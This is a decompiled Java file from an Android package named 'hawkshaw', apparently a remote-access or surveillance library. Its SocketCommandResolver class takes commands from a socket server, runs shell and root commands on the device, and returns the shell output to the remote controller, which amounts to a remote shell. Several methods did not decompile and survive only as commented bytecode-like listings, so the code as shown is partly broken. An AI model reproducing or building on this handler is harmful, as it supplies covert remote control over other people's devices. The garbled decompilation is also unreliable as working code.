package com.hawkshaw.library.datalayer.network.socket;

import E0.C0010a;
import W2.y;
import Y1.J;
import Y1.K;
import a3.e;
import a3.j;
import b3.C0298a;
import com.hawkshaw.library.datalayer.models.SocketCommandRequest;
import com.hawkshaw.library.datalayer.models.SocketCommandResponse;
import com.hawkshaw.library.deviceinfo.Shell;
import com.hawkshaw.library.ktextensions.CoroutineKt;
import com.hawkshaw.library.logger.Logger;
import j3.f;
import t3.N;

public final class SocketCommandResolverKt {
    private static final String TAG = "SocketCommandResolver";

    public /* synthetic */ class WhenMappings {
        public static final /* synthetic */ int[] $EnumSwitchMapping$0;

        /* JADX WARNING: Can't wrap try/catch for region: R(11:0|1|2|3|4|5|6|7|8|9|11) */
        /* JADX WARNING: Failed to process nested try/catch */
        /* JADX WARNING: Missing exception handler attribute for start block: B:3:0x0010 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:5:0x0019 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:7:0x0022 */
        static {
            /*
                com.hawkshaw.library.datalayer.models.SocketCommandRequest$Type[] r0 = com.hawkshaw.library.datalayer.models.SocketCommandRequest.Type.values()
                int r0 = r0.length
                int[] r0 = new int[r0]
                com.hawkshaw.library.datalayer.models.SocketCommandRequest$Type r1 = com.hawkshaw.library.datalayer.models.SocketCommandRequest.Type.Unknown     // Catch:{ NoSuchFieldError -> 0x0010 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0010 }
                r2 = 1
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0010 }
            L_0x0010:
                com.hawkshaw.library.datalayer.models.SocketCommandRequest$Type r1 = com.hawkshaw.library.datalayer.models.SocketCommandRequest.Type.Message     // Catch:{ NoSuchFieldError -> 0x0019 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0019 }
                r2 = 2
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0019 }
            L_0x0019:
                com.hawkshaw.library.datalayer.models.SocketCommandRequest$Type r1 = com.hawkshaw.library.datalayer.models.SocketCommandRequest.Type.RootCommand     // Catch:{ NoSuchFieldError -> 0x0022 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0022 }
                r2 = 3
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0022 }
            L_0x0022:
                com.hawkshaw.library.datalayer.models.SocketCommandRequest$Type r1 = com.hawkshaw.library.datalayer.models.SocketCommandRequest.Type.Shell     // Catch:{ NoSuchFieldError -> 0x002b }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x002b }
                r2 = 4
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x002b }
            L_0x002b:
                $EnumSwitchMapping$0 = r0
                return
            */
            throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.network.socket.SocketCommandResolverKt.WhenMappings.<clinit>():void");
        }
    }

    /* access modifiers changed from: private */
    /* JADX WARNING: Code restructure failed: missing block: B:3:0x0005, code lost:
        r2 = com.hawkshaw.library.handler.CommandResolverKt.handleCommand(r2.getCommand(), com.hawkshaw.library.handler.CommandSource.Socket, r3);
     */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object handleRootCommand(com.hawkshaw.library.datalayer.models.SocketCommandRequest.RootCommandRequest r2, a3.e r3) {
        /*
            W2.y r0 = W2.y.f2418a
            if (r2 != 0) goto L_0x0005
            return r0
        L_0x0005:
            com.hawkshaw.library.datalayer.models.Command r2 = r2.getCommand()
            com.hawkshaw.library.handler.CommandSource r1 = com.hawkshaw.library.handler.CommandSource.Socket
            java.lang.Object r2 = com.hawkshaw.library.handler.CommandResolverKt.handleCommand(r2, r1, r3)
            b3.a r3 = b3.C0298a.f4140D
            if (r2 != r3) goto L_0x0014
            return r2
        L_0x0014:
            return r0
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.network.socket.SocketCommandResolverKt.handleRootCommand(com.hawkshaw.library.datalayer.models.SocketCommandRequest$RootCommandRequest, a3.e):java.lang.Object");
    }

    private static final void handleShellCommand(SocketCommandRequest.ShellRequest shellRequest) {
        if (shellRequest != null) {
            SocketService.Companion.sendResponse(new SocketCommandResponse(SocketCommandResponse.Type.Shell, 0, new SocketCommandResponse.ShellResponse(Shell.INSTANCE.runShellCommand(shellRequest.getCommand())), 2, (f) null));
        }
    }

    public static final void handleSocketCommand(String str) {
        K.n(str, "commandStr");
        CoroutineKt.safeLaunch$default(J.a(N.f9290a), (j) null, new a(str, (e) null), 1, (Object) null);
    }

    /* access modifiers changed from: private */
    public static final Object handleSocketCommand(SocketCommandRequest socketCommandRequest, e eVar) {
        int i5 = WhenMappings.$EnumSwitchMapping$0[socketCommandRequest.getType().ordinal()];
        y yVar = y.f2418a;
        if (i5 == 1) {
            Logger.e$default(Logger.INSTANCE, TAG, C0010a.n("HandleSocketCommand: Unknown command, ", socketCommandRequest.getSentTime()), (Exception) null, false, 12, (Object) null);
        } else if (i5 == 3) {
            Object handleRootCommand = handleRootCommand(socketCommandRequest.getRootCommandRequest(), eVar);
            return handleRootCommand == C0298a.f4140D ? handleRootCommand : yVar;
        } else if (i5 == 4) {
            handleShellCommand(socketCommandRequest.getShellRequest());
        }
        return yVar;
    }
}
